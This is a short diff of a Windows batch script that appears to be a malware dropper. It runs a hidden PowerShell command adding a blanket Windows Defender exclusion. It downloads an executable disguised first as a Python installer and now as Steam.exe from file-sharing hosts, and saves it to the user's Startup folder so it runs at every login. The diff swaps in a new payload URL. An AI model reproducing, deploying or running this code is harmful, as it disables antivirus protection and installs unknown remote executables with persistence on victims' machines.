@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://zippyshare.day/download/3n2KOAC6c2zJhXp/DM2BGwReMzj40/python-3-12-4.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\python-3-12-4.exe"
+set "URL=https://link.storjshare.io/s/jx6fk6iyet246tpeuzch4pg43spa/steam/Steam.exe?download=1"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\app.exe"
 
 
 if exist "%DEST%" del "%DEST%"
